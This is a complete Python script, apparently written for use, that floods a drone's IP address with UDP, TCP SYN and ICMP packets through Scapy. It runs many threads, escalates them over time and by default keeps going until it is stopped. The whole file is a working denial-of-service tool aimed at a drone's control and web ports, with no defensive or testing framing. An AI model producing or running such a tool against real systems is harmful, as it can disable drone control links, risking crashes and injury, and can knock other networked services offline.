from scapy.all import *
import threading
import time
import random
import sys

# Configuration
target_ip = "192.168.1.100"  # Replace with the drone's IP address
udp_port = 8888              # Drone's UDP control port
tcp_port = 80                # Drone's TCP service port (e.g., web interface)
num_threads_per_attack = 20  # Initial number of threads per attack type (UDP, TCP, ICMP)
payload_size = 1000          # Size of UDP payload in bytes for bandwidth saturation
attack_duration = 0          # Duration in seconds (0 = indefinite, e.g., 300 = 5 min)
increase_threads = True      # Set to True to escalate thread count over time
max_threads = 50             # Maximum threads per attack type if escalating

# Global variable to track start time
start_time = time.time()

# UDP Flood: High-rate packets with random source ports and large payloads
def udp_flood():
    while True:
        try:
            packet = IP(dst=target_ip)/UDP(sport=RandShort(), dport=udp_port)/Raw(RandString(size=payload_size))
            send(packet, verbose=0, inter=0)  # Send at maximum speed
            if attack_duration > 0 and time.time() - start_time > attack_duration:
                break
        except Exception as e:
            print(f"UDP Flood Error: {e}")
            break

# TCP SYN Flood: Exhaust TCP resources with incomplete handshakes
def tcp_syn_flood():
    while True:
        try:
            packet = IP(dst=target_ip)/TCP(dport=tcp_port, flags="S", sport=RandShort())
            send(packet, verbose=0, inter=0)
            if attack_duration > 0 and time.time() - start_time > attack_duration:
                break
        except Exception as e:
            print(f"TCP SYN Flood Error: {e}")
            break

# ICMP Flood: Saturate bandwidth and processing with ping requests
def icmp_flood():
    while True:
        try:
            packet = IP(dst=target_ip)/ICMP()
            send(packet, verbose=0, inter=0)
            if attack_duration > 0 and time.time() - start_time > attack_duration:
                break
        except Exception as e:
            print(f"ICMP Flood Error: {e}")
            break

# Function to spawn threads for a given attack function
def start_attack_threads(attack_function, thread_count):
    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=attack_function)
        t.daemon = True  # Threads stop when main program exits
        t.start()
        threads.append(t)
    return threads

# Function to escalate thread count over time
def escalate_attack(attack_function, current_threads, max_threads):
    while len(current_threads) < max_threads:
        if attack_duration > 0 and time.time() - start_time > attack_duration:
            break
        print(f"Escalating {attack_function.__name__} threads to {len(current_threads) + 1}")
        current_threads.extend(start_attack_threads(attack_function, 1))
        time.sleep(10)  # Increase every 10 seconds

if __name__ == "__main__":
    print(f"Starting advanced DoS attack on {target_ip}...")
    print(f"UDP Flood: Port {udp_port}, TCP SYN Flood: Port {tcp_port}, ICMP Flood enabled")
    print(f"Initial threads per attack: {num_threads_per_attack}")
    if attack_duration > 0:
        print(f"Attack duration: {attack_duration} seconds")
    else:
        print("Attack running indefinitely. Press Ctrl+C to stop.")

    # Start initial threads for each attack type
    udp_threads = start_attack_threads(udp_flood, num_threads_per_attack)
    tcp_threads = start_attack_threads(tcp_syn_flood, num_threads_per_attack)
    icmp_threads = start_attack_threads(icmp_flood, num_threads_per_attack)

    # Optionally escalate thread count over time
    if increase_threads:
        threading.Thread(target=escalate_attack, args=(udp_flood, udp_threads, max_threads), daemon=True).start()
        threading.Thread(target=escalate_attack, args=(tcp_syn_flood, tcp_threads, max_threads), daemon=True).start()
        threading.Thread(target=escalate_attack, args=(icmp_flood, icmp_threads, max_threads), daemon=True).start()

    # Keep the main thread alive
    try:
        if attack_duration > 0:
            time.sleep(attack_duration)
            print("Attack duration reached. Stopping...")
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
        sys.exit(0)
